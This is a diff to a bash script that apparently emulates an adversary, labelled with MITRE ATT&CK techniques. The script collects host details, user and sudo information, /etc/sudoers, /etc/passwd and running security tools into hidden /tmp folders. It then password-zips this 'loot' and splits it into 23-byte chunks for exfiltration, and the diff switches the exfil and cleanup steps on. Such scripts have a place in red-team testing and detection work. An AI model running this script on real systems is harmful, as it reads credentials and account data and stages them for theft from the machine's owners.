@@ -13,8 +13,8 @@ if [ ! -d "/tmp/.exfil/" ]; then mkdir -p /tmp/.exfil/; fi;
 ############################################
 function discovery() {
   SYSINF="/tmp/.staging/system.txt"
-  echo -e "Target Platform: $PLAT \n"
-  echo "Target Platform: " $PLAT >> $SYSINF
+  echo -e "Target Platform: $OSTYPE "
+  echo "Target Platform: " $OSTYPE >> $SYSINF
   echo "Target Kernel:" >> $SYSINF && uname -a >> $SYSINF
   echo "Uptime:" >> $SYSINF && uptime >> $SYSINF
   echo "hostname:" >> $SYSINF && hostname >> $SYSINF
@@ -27,14 +27,14 @@ function discovery() {
   ### Technique: Account Discovery https://attack.mitre.org/wiki/Technique/T1087
   ### Collect User Account Information
   USERINF=/tmp/.staging/users.txt
-  echo -e "Getting User Information \n"
+  echo -e "Getting User Information "
   echo "Whoami:" >> $USERINF && whoami >> $USERINF
   echo "Current User Activity:" >> $USERINF && w >> $USERINF 2> /dev/null
   echo "Sudo Privs" >> $USERINF && sudo -l -n >> $USERINF 2> /dev/null
   echo "Sudoers" >> $USERINF && cat /etc/sudoers >> $USERINF 2> /dev/null
   echo "Last:" >> $USERINF && last >> $USERINF 2> /dev/null
 
-  echo -e "Getting Linux Group Information \n"
+  echo -e "Getting Linux Group Information "
   echo "Group Information:" >> $USERINF
   cat /etc/passwd >> $USERINF
   echo "Elevated Users" >> $USERINF && grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' >> $USERINF
@@ -43,7 +43,7 @@ function discovery() {
   ### Technique: Software Discovery: Security Software Discovery https://attack.mitre.org/techniques/T1518/001/
   ### Check for common security Software
   SECINF=/tmp/.staging/security.txt
-  echo -e "Getting Security Software Information \n"
+  echo -e "Getting Security Software Information "
   echo "Running Security Processes" >> $SECINF && ps ax | grep -v grep | grep -e Carbon -e Snitch -e OpenDNS -e RTProtectionDaemon -e CSDaemon -e cma >> $SECINF
 }
 
@@ -53,10 +53,10 @@ function discovery() {
 # Technique:  Archive Collected Data: Archive via Library https://attack.mitre.org/techniques/T1560/002/
 ############################################
 function exfil() {
-echo -e "Compress and encrypt all collected data for exfil \n"
-zip --password "Hope You Have Eyes on This!!" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1
+echo -e "Compress and encrypt all collected data for exfil "
+zip --password "Hope" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1
 
-echo -e "Prepare Exfil data - Split file into small chucks (23byte) before Exfil \n"
+echo -e "Prepare Exfil data - Split file into small chucks (23byte) before Exfil "
 split -a 15 -b 23 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"
 }
 
@@ -74,5 +74,5 @@ function cleanup() {
 
 
 discovery
-#exfil
-#cleanup
+exfil
+cleanup
